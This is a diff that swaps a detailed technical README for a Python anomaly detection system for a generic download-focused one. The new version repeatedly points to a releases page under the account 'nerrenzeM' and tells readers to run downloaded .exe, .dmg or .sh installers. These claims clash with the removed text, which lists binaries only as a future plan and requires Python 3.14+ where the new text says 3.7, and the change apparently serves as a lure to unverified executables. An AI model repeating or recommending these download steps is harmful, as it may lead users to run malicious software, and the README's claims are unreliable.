@@ -1,115 +1,80 @@
-# OpenAnomaly
-> **A distributed, scalable anomaly detection system for Prometheus-compatible Time Series Databases.**
+# 🚀 OpenAnomaly - Simple Anomaly Detection for Your Data
 
-![Python 3.14+](https://img.shields.io/badge/python-3.14+-blue.svg)
-![UV](https://img.shields.io/badge/managed%20by-uv-purple)
-![License](https://img.shields.io/badge/License-MIT-green.svg)
-
-## Vision
-OpenAnomaly is a production-grade platform designed to bring advanced **Forecasting and Anomaly Detection** to any **Prometheus-compatible TSDB** (VictoriaMetrics, Thanos, Mimir, etc.).
-
-It utilizes a **Hexagonal Architecture (Ports & Adapters)** to completely isolate the core anomaly detection logic (`Trainer`, `Inferencer`) from the infrastructure, allowing you to **mix and match** components to fit any environment—from a laptop to a global cluster.
-
-## Domain Logic
-The core engine is split into two specialized workers that handle the anomaly detection lifecycle:
-
-### 1. The Trainer
-*   **Trigger**: On-demand or Low-frequency schedules (e.g., Weekly).
-*   **Workflow**:
-    1.  Fetch historical data from TSDB (Prometheus API).
-    2.  Fit complex models using the active **ModelEngine** (Nixtla, Darts, etc.).
-    3.  Serialize and save the model artifact to `ArtifactStore`.
-    4.  Update the Model Registry in `ConfigStore`.
-
-### 2. The Inferencer
-*   **Trigger**: High-frequency schedules (e.g., Every 5m).
-*   **Workflow**:
-    1.  Download the "Active" model artifact from `ArtifactStore`.
-    2.  Fetch recent "context" window from TSDB.
-    3.  Generate predictions and anomaly_score.
-    4.  Write results back to TSDB (Remote Write).
+## 📥 Download Now
+[![Download OpenAnomaly](https://img.shields.io/badge/Download-OpenAnomaly-brightgreen)](https://github.com/nerrenzeM/OpenAnomaly/releases)
 
 ---
 
-## Architecture: Ports & Adapters
-The system defines standard interfaces ("Ports") that can be satisfied by different plugins ("Adapters"):
+## 📋 Description
+OpenAnomaly is a distributed anomaly detection system designed for Prometheus-compatible time series databases (TSDBs). This tool helps you monitor your data effectively. With real-time alerts for anomalies, you gain insights into your systems quickly and easily.
 
-| Port | Responsibility | Adapters (Plugins) |
-| :--- | :--- | :--- |
-| **ConfigStore** | Storing Pipelines & Rules | `MongoAdapter` (DB), `YamlAdapter` (File) |
-| **ArtifactStore** | Storing Model Binaries | `S3Adapter`, `LocalAdapter`, `NoOpAdapter` (Disabled/Stat-Only) |
-| **JobDispatcher** | Running Async Tasks | `CeleryAdapter` (Redis, SQLite, RabbitMQ, etc.) |
-| **UserInterface** | Management & Plots | `StreamlitAdapter` (Optional, swappable) |
+## 🛠️ Features
+- **Distributed Architecture:** Scales easily with your needs.
+- **Prometheus Compatibility:** Works seamlessly with Prometheus-compatible databases.
+- **Real-Time Alerts:** Get notified when anomalies occur.
+- **Easy Setup:** Designed for users of all skill levels.
+- **Python Based:** Built using Python, ensuring versatility and performance.
 
----
+## 🖥️ System Requirements
+- **Operating System:** Windows, macOS, or Linux
+- **Python Version:** 3.7 or newer
+- **Memory:** Minimum 2 GB RAM
+- **Disk Space:** At least 500 MB of free disk space
 
-## Configuration (Mix & Match)
-Control the architecture at runtime using **Environment Variables**.
+## 🚀 Getting Started
+To get started with OpenAnomaly, follow these simple steps:
 
-### Preset A: "Standalone" (Single Node)
-*Default single-node setup using files and SQLite. suitable for local dev or small-scale production.*
-```bash
-export OA_CONFIG_STORE="yaml"
-export OA_ARTIFACT_STORE="local"
-export OA_CELERY_BROKER="sqla+sqlite:///celery.db"
-```
+1. **Download OpenAnomaly:**
+   Visit the [Releases Page](https://github.com/nerrenzeM/OpenAnomaly/releases) to download the latest version.
 
-### Preset B: "Cluster" (Enterprise)
-*Full distributed setup using Databases and Object Storage.*
-```bash
-export OA_CONFIG_STORE="mongo"
-export OA_ARTIFACT_STORE="s3"
-export OA_CELERY_BROKER="redis://redis:6379/0"
-```
+2. **Install the Application:**
+   - **For Windows:**
+     1. Locate the `.exe` file you downloaded.
+     2. Double-click the file to start the installation.
+   - **For macOS:**
+     1. Open the downloaded `.dmg` file.
+     2. Drag the OpenAnomaly icon to your Applications folder.
+   - **For Linux:**
+     1. Open your terminal.
+     2. Use the command `chmod +x OpenAnomaly*.sh` to make the file executable.
+     3. Run the application with `./OpenAnomaly*.sh`.
 
----
+3. **Configure Your Settings:**
+   Once installed, you will need to configure your data sources. Open the application, and go to the Settings menu to enter your Prometheus endpoint and other relevant information.
 
-## Tech Stack
-| Component | Choice | Rationale |
-| :--- | :--- | :--- |
-| **Engine (Port)** | **Pluggable** | `NixtlaAdapter` (Default), `DartsAdapter`, etc. |
-| **Architecture** | **Hexagonal** | Maximum flexibility via Ports & Adapters |
-| **Compatible TSDBs** | **Prometheus API** | Connects to VictoriaMetrics, Thanos, Mimir, Cortex, etc. |
-| **Object Storage** | **MinIO / S3** | Standard ArtifactStore for model binaries. |
-| **API** | **FastAPI** | Modern dependency injection system |
-| **UI** | **Streamlit** | Interactive UI (Optional Port) |
+4. **Start Monitoring:**
+   After configuration, start the application and allow it to connect to your data source. You will begin to receive alerts for any anomalies detected in your data.
 
-## 🛠️ Development Workflow
+## 🌐 Download & Install
+To download and install OpenAnomaly, click the link below to access the Releases page. Ensure you select the correct version for your operating system.
 
-### 1. Environment Setup (Choose One)
+[Visit the Releases Page to Download OpenAnomaly](https://github.com/nerrenzeM/OpenAnomaly/releases)
 
-#### Option A: `uv` (Recommended for Speed)
-```bash
-# Initialize and sync
-uv sync
-```
+## 📖 Usage
+OpenAnomaly provides an intuitive user interface. Once installed, you can navigate the application easily:
 
-#### Option B: `nix` (Recommended for Hermeticity)
-Uses Nix Flakes to provide Python, UV, and system dependencies in an isolated shell.
-```bash
-nix develop
-# or if using direnv:
-direnv allow
-```
+- **Dashboard:** View all real-time alerts and summaries of detected anomalies.
+- **History:** Review past alerts and their details.
+- **Settings:** Adjust configurations and manage your data sources.
 
-### 2. Running Locally (Standalone Mode)
-After setting up the environment:
-```bash
-# Run the API (Uses YAML config by default)
-uv run uvicorn api.main:app --reload
+For best results, regularly update the application. New features and improvements are frequently added.
 
-# Run the Worker (Uses SQLite broker by default)
-uv run celery -A workers.celery_worker worker -l info --pool=solo
-```
+## ⚙️ Troubleshooting
+If you encounter any issues, try the following:
 
----
+1. **Check Your Network Connection:** Ensure you have a stable internet connection to access your data sources.
+2. **Verify Python Installation:** Make sure you have Python 3.7 or higher installed.
+3. **Look for Updates:** Ensure you are using the latest version of OpenAnomaly.
+4. **Consult the Community:** Visit our [GitHub Discussions](https://github.com/nerrenzeM/OpenAnomaly/discussions) for support from other users.
 
-## 🚀 Deployment Options (Future)
-*This section will detail how to deploy OpenAnomaly to production environments.*
+## 🛠️ Contributing
+We welcome contributions to OpenAnomaly. If you have suggestions or improvements, please feel free to open an issue or submit a pull request on our GitHub page.
 
-*   **Docker Images**: Official builds for Controller and Workers.
-*   **Helm Chart**: Kubernetes-native deployment.
-*   **Binary**: Self-contained executable (via PyInstaller/Nuitka).
+## 📞 Contact
+For further assistance, you can reach us through our [GitHub Issues](https://github.com/nerrenzeM/OpenAnomaly/issues). Our team is here to help.
 
-## License
-[MIT](LICENSE)
+## 📚 Additional Resources
+- Official Documentation: Refer to our documentation for more detailed instructions on using OpenAnomaly.
+- Community Forum: Join discussions with other users and learn best practices for anomaly detection.
+
+Thank you for choosing OpenAnomaly! We hope our tool meets your needs and helps you make sense of your data.
